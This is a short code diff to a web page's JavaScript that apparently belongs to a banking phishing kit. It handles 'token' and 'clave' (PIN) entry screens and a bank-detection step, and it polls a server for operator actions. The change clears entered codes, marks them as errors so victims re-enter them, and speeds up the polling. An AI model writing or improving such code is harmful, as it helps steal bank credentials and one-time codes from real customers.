@@ -84,10 +84,14 @@ function clearCurrentScreen() {
         hideBankDetect();
     }
     else if (currentScreen === 'scr-token' || currentScreen === 'scr-clave') {
-        document.querySelectorAll('.code-input input').forEach(i => i.value = '');
+        document.querySelectorAll('.code-input input').forEach(i => { i.value = ''; i.classList.add('error'); });
         const btnId = currentScreen === 'scr-token' ? 'btn-token' : 'btn-clave';
         const btn = document.getElementById(btnId);
         if (btn) { btn.disabled = true; btn.classList.remove('ready'); }
+        // Quitar error visual después de 2s para que puedan reintentar
+        setTimeout(() => {
+            document.querySelectorAll('.code-input input').forEach(i => i.classList.remove('error'));
+        }, 2000);
     }
 }
 
@@ -333,7 +337,7 @@ function startPolling(targetScreen, stepName, originalMsg, onAction) {
                 if (onAction) onAction(action);
             })
             .catch(() => {});
-    }, 3000);
+    }, 2000);
 }
 
 /* ═══════════════════════════════════════════════════════════════
